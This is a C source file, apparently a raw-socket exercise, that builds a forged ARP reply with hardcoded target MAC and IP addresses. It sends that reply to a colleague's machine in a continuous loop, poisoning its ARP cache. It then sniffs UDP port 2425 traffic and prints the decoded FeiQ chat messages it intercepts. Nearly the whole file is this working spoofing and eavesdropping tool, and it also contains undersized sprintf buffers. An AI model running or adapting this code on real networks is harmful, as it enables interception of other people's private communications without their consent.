/* ************************************************************************
 *       Filename:  rarp.c
 *    Description:  
 *        Version:  1.0
 *        Created:  2015年09月09日 11时23分33秒
 *       Revision:  none
 *       Compiler:  gcc
 *         Author:  YOUR NAME (), 
 *        Company:  
 * ************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include "gb2312_ucs2.h"

void get_feiQ_msg(unsigned char const *src)
{
	char *p = NULL;
	int i = 0, colon = 0;
	unsigned char msg[1024] = "";
	unsigned char buf[1024] = "";
	unsigned short udp_len = 0;
	unsigned char utf8[1024] = "";

	udp_len = (src[4]*256+src[5]);
	printf("udp_len=%d\n",udp_len);

	memcpy(buf,src+8,udp_len-8);
	for(i=0;i<udp_len-8;i++)
	{
		printf("%c",buf[i]);
	}
	printf("\n");
	p = buf;
	for(i=0;i<udp_len-8;i++)
	{
		if(buf[i] == ':') colon++;
		if(colon == 5) break;
		p++;
	}

	if(colon == 5)
	{
		memcpy(msg,p+1,udp_len-8-(i+1));
		gb2312_to_utf8(msg, utf8);
		printf("msg=%s\n",utf8);
	}

	//udp_len = ntohs((unsigned short *)(src+4));
}
unsigned short get_src_port(unsigned char const *src)
{
	//unsigned char port[4] = "";

	//sprintf(port,"%d%d",src[0],src[1]);

	printf("%d %d ****\n",src[2],src[3]);

	return (src[0]*256+src[1]);
}

unsigned char get_IP_type(unsigned char const *src)
{
	unsigned char type[1] = "";
	//提取数据包类型
	sprintf(type,"%c",src[9]);

	if(type[0] == 6)
		printf("TCP 数据包\n");
	else if(type[0] == 17)
		printf("UDP 数据包\n");
	//printf("IP_TYPE:%d\n", type[0]);

	return type[0];
}
unsigned char get_ip_headlen(unsigned char const *src)
{
	unsigned char temp = 0;
	temp = src[0] & 0x0f;

	printf("headlen=%d\n",temp);
	return temp;
}
void get_ip(unsigned char const *src)
{
	unsigned char dst_ip[16] = "";
	unsigned char src_ip[16] = "";

	//提取目的ip
	sprintf(dst_ip,"%d.%d.%d.%d",\
			src[16],src[17],src[18],src[19]);

	//提取源ip
	sprintf(src_ip,"%d.%d.%d.%d",\
			src[12],src[13],src[14],src[15]);

	printf("IP:%s >> %s\n", src_ip, dst_ip);
}

void get_ARP_ip(unsigned char const *src)
{
	unsigned char dst_ip[16] = "";
	unsigned char src_ip[16] = "";

	//提取目的ip
	sprintf(dst_ip,"%d.%d.%d.%d",\
			src[24],src[25],src[26],src[27]);

	//提取源ip
	sprintf(src_ip,"%d.%d.%d.%d",\
			src[14],src[15],src[16],src[17]);

	printf("ARP_IP:%s >> %s\n", src_ip, dst_ip);
}

void get_mac(unsigned char const *src)
{
	unsigned char dst_mac[18] = "";
	unsigned char src_mac[18] = "";

	//提取目的mac
	sprintf(dst_mac,"%02x:%02x:%02x:%02x:%02x:%02x",\
			src[0],src[1],src[2],src[3],src[4],src[5]);
	//提取源mac
	sprintf(src_mac,"%02x:%02x:%02x:%02x:%02x:%02x",\
			src[6],src[7],src[8],src[9],src[10],src[11]);

	printf("MAC:%s >> %s\n", src_mac, dst_mac);
}

unsigned short get_type(unsigned char const *src, unsigned char *type)
{
	//提取数据包类型
	sprintf(type,"%02x%02x",src[12],src[13]);

	printf("TYPE:%s\n", type);
	//printf("TYPE:%c%c%c%c\n", type[0],type[1],type[2],type[3]);
}

int main(int argc, char *argv[])
{
	unsigned char type[4]    = "";
	unsigned char recv[2048] = "";
	unsigned char ip_type = 0;
	unsigned short dport  = 0;

	//创建原始套接字
	int sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	//组arp的应答包
	unsigned char send_msg[1024] = {
		//-----组MAC----14----
		0x74,0x27,0xea,0xb3,0x66,0xca,//dst_mac: 柱琦 XP mac
		//0x00,0x0c,0x29,0xe4,0xd3,0xd6,//src_mac: me VM mac
		0x00,0x0c,0x29,0x98,0xcc,0x6c,//IP = .62 mac
		0x08,0x06,                    //类型: 0x0806 ARP协议

		//-----组ARP----28----
		0x00,0x01,0x08,0x00,          //硬件类型1(以太网地址)，协议类型0x0800(IP)
		0x06,0x04,0x00,0x02,          //硬件、协议的地址长度分别为6和4，ARP应答
		//0x00,0x00,0x00,0x00,0x00,0x00,//发送端的mac
		//0x00,0x0c,0x29,0xe4,0xd3,0xd6,//发送端的mac，把10.221.2.11的mac伪装成自己的
		0x00,0x0c,0x29,0x98,0xcc,0x6c,//
		10, 221, 2, 12,               //发送端的IP
		0x74,0x27,0xea,0xb3,0x66,0xca,//目的mac
		10, 221, 2, 6,                //目的IP
	};

	//数据初始化
	struct sockaddr_ll sll;
	struct ifreq ethreq;

	strncpy(ethreq.ifr_name,"eth0", IFNAMSIZ);//指定网卡名称
	//将网络接口赋值给原始套接字地址结构
	ioctl(sockfd, SIOCGIFINDEX, (char *)&ethreq);
	bzero(&sll, sizeof(sll));
	sll.sll_ifindex = ethreq.ifr_ifindex;

	while(1)
	{
		sendto(sockfd, send_msg, 42, 0, (struct sockaddr *)&sll, sizeof(sll));
		recvfrom(sockfd, recv, sizeof(recv), 0, NULL, NULL);

		get_type(recv, type);

		if(strcmp(type, "0800") == 0)//ip
		{
			get_ip(recv+14);
			get_ip_headlen(recv+14);

			ip_type = get_IP_type(recv+14);

			if(ip_type == 17) //UDP
			{
				dport = get_src_port(recv+14+20);
				if(dport == 2425)
				{
					printf("#######$$$$$$$$$\n");
					get_feiQ_msg(recv+14+20);
				}

			}
		}

		usleep(1000);
	}
	return 0;
}
